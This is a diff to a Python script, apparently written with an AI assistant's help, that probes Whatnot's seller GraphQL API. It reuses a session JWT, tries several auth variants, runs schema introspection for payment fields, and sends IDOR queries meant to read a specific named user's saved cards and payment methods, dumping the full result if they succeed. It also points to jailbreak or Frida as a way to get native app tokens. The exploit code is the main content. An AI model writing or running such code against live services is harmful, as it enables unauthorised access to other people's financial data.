@@ -11,6 +11,7 @@ Usage:
 import requests, json, sys, base64, time
 
 WEB_GQL    = "https://www.whatnot.com/services/graphql/"
+SELLER_GQL = "https://api.whatnot.com/seller-api/graphql"
 B_ID       = "58968144"
 B_USERNAME = "anyako0810"
 
@@ -256,6 +257,138 @@ def main():
         except Exception:
             pass
         print()
+
+    # ── Step 5: Seller API — try web JWT as Bearer token ─────────────────────
+    section("Step 5: Seller API auth — web JWT as Bearer")
+
+    # Extract raw JWT value from __Secure-access-token cookie
+    access_jwt = None
+    for part in cookies.split(';'):
+        p = part.strip()
+        if p.startswith('__Secure-access-token=') and 'expiration' not in p:
+            access_jwt = p.split('=', 1)[1]
+            break
+
+    if not access_jwt:
+        print("  Could not extract __Secure-access-token from cookies")
+    else:
+        print(f"  JWT length: {len(access_jwt)} chars, prefix: {access_jwt[:40]}...")
+
+        seller_headers_base = {
+            "Content-Type": "application/json",
+            "Accept": "application/json",
+            "Origin": "https://www.whatnot.com",
+            "Referer": "https://www.whatnot.com/",
+            "X-Whatnot-App": "whatnot-web",
+            "X-Whatnot-App-Version": "20260515-1640",
+            "X-Whatnot-App-Context": "next-js/browser",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1",
+        }
+
+        # Try 4 auth variants
+        auth_variants = [
+            ("JWT Bearer",          {**seller_headers_base, "Authorization": f"Bearer {access_jwt}"}),
+            ("Cookie header",       {**seller_headers_base, "Cookie": cookies}),
+            ("Cookie auth header",  {**seller_headers_base, "Authorization": "Cookie", "Cookie": cookies}),
+            ("JWT + Cookie",        {**seller_headers_base, "Authorization": f"Bearer {access_jwt}", "Cookie": cookies}),
+        ]
+
+        working_headers = None
+        for variant_name, hdrs in auth_variants:
+            try:
+                r = requests.post(SELLER_GQL, headers=hdrs,
+                                  json={"query": "{ me { id username } }"}, timeout=15)
+                snippet = r.text[:200].replace('\n', ' ')
+                print(f"\n  [{variant_name}] HTTP {r.status_code}: {snippet}")
+                if r.status_code == 200:
+                    try:
+                        d = r.json()
+                        me_s = d.get("data", {}).get("me")
+                        if me_s and me_s.get("id"):
+                            print(f"  *** SELLER API AUTH WORKS ({variant_name}) ***")
+                            print(f"  me.id={me_s['id']}  me.username={me_s.get('username')}")
+                            working_headers = hdrs
+                            working_headers["_variant"] = variant_name
+                            break
+                    except Exception:
+                        pass
+            except Exception as e:
+                print(f"  [{variant_name}] request error: {e}")
+
+        # ── Step 6: Seller API introspection ──────────────────────────────────
+        if working_headers:
+            variant_name = working_headers.pop("_variant", "")
+            section(f"Step 6: Seller API introspection (auth={variant_name})")
+
+            INTRO_Q = '''
+            {
+              __schema {
+                queryType { fields { name } }
+              }
+            }'''
+            r = requests.post(SELLER_GQL, headers=working_headers,
+                              json={"query": INTRO_Q}, timeout=15)
+            print(f"HTTP {r.status_code}")
+            try:
+                fields = (r.json().get("data", {}).get("__schema", {})
+                          .get("queryType", {}).get("fields", []))
+                names = [f["name"] for f in fields]
+                pay = [n for n in names if any(k in n.lower() for k in
+                       ["pay", "card", "wallet", "billing", "bank", "credit", "user"])]
+                print(f"Query fields ({len(names)}): {', '.join(names)}")
+                print(f"\nPayment/user-related: {pay}")
+            except Exception:
+                print(r.text[:500])
+
+            # ── Step 7: Seller API IDOR — Account A reads Account B's cards ──
+            section(f"Step 7: Seller API IDOR — Account A → Account B cards")
+            print(f"  Authenticated as: {a_id} ({a_user})")
+            print(f"  Targeting:        {B_ID} ({B_USERNAME})\n")
+
+            PAY_FRAG = ("paymentMethods(first:10) { edges { node { id last4 brand expMonth expYear } } }")
+            CARD_FRAG2 = ("cards(first:10) { edges { node { id cardDescription cardReference cardType gateway default } } }")
+
+            seller_idor = [
+                ("me own cards",
+                 f'{{ me {{ id {CARD_FRAG2} }} }}'),
+                ("me own paymentMethods",
+                 f'{{ me {{ id {PAY_FRAG} }} }}'),
+                ("user(id) cards",
+                 f'{{ user(id: "{B_ID}") {{ id {CARD_FRAG2} }} }}'),
+                ("user(id) paymentMethods",
+                 f'{{ user(id: "{B_ID}") {{ id {PAY_FRAG} }} }}'),
+                ("user(username) cards",
+                 f'{{ user(username: "{B_USERNAME}") {{ id {CARD_FRAG2} }} }}'),
+                ("node(id) cards",
+                 f'{{ node(id: "{B_ID}") {{ id ... on User {{ {CARD_FRAG2} }} }} }}'),
+                ("alias me+victim",
+                 f'{{ me {{ id }} victim: user(id: "{B_ID}") {{ id {CARD_FRAG2} {PAY_FRAG} }} }}'),
+            ]
+
+            for name, q in seller_idor:
+                try:
+                    r = requests.post(SELLER_GQL, headers=working_headers,
+                                      json={"query": q}, timeout=15)
+                    snippet = r.text[:600]
+                    print(f"  [{name}]")
+                    print(f"  HTTP {r.status_code}: {snippet}\n")
+
+                    d = r.json()
+                    for key in ["user", "victim", "node"]:
+                        node = d.get("data", {}).get(key)
+                        if node:
+                            for pay_key in ["cards", "paymentMethods"]:
+                                edges = (node.get(pay_key, {}) or {}).get("edges", [])
+                                if edges:
+                                    print(f"  *** SELLER API IDOR CONFIRMED *** [{name}]")
+                                    print(f"  Account A read Account B's payment data via {pay_key}!")
+                                    print(f"  FULL PAYLOAD: {json.dumps(node)}")
+                except Exception as e:
+                    print(f"  [{name}] error: {e}\n")
+        else:
+            print("\n  No Seller API auth variant worked.")
+            print("  To test the Seller API IDOR you need a wn_access_tk_ Bearer token")
+            print("  from the native iOS app (requires jailbreak/Frida) or Android device.")
 
     print("\n" + "="*60)
     print("  Done. Paste the full output above to Claude.")
